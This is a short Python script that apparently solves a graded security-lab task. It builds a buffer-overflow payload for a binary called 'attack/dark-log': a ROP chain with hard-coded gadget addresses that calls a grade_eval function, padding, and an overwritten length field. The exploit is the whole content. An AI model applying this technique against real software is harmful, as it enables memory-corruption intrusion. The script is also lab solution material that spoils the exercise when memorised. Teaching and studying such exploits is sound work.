#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""

#!/usr/bin/env python3
import struct
import sys

def p64(x):
    return struct.pack("<Q", x)

# ROP chain
chain = b"".join([
    p64(0x4018a4),  # ret: stack alignment
    p64(0x4018a3),  # pop rdi; ret
    p64(4),         # argument for grade_eval
    p64(0x401677),  # grade_eval
    p64(0),         # return target after grade_eval
])

# First 128 bytes: ROP chain
expression = chain.ljust(128, b"A")

# Reach len at offset 256
padding = b"B" * 128

# len = 200 (0xc8)
length = struct.pack("<i", 200)

payload = expression + padding + length

assert len(payload) == 260
assert b"\x0a" not in payload

sys.stdout.buffer.write(payload)

